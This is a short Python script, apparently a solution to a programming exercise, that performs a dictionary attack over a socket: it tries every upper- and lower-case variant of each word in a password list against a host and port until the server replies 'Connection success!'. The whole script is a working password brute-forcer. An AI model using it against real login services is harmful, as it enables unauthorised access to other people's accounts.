import socket
import sys
from itertools import product
import os

base_path = os.path.dirname(__file__)
file_path = os.path.join(base_path, 'passwords.txt')

# Get hostname and port
args = sys.argv
hostname, port = args[-2:]
address = (hostname, int(port))

# Create Socket and connect
with socket.socket() as connection_socket:
    connection_socket.connect(address)
    with open(file_path, 'r') as f:
        passwords = f.readlines()
    i = 1
    # Check Through all pharses
    for phrase in passwords:
        phrase = phrase.strip()
        # Generate all possible combinations
        for password in set(product(*zip(phrase.lower(), phrase.upper()))):
            password = "".join(password)
            # Send Password
            connection_socket.send(password.encode())
            # Get Response
            response = connection_socket.recv(1024).decode()
            # Print Password if Found
            if response == 'Connection success!':
                print(password)
                exit()
            if response == 'Too many attempts':
                print('Not Found')
                exit()
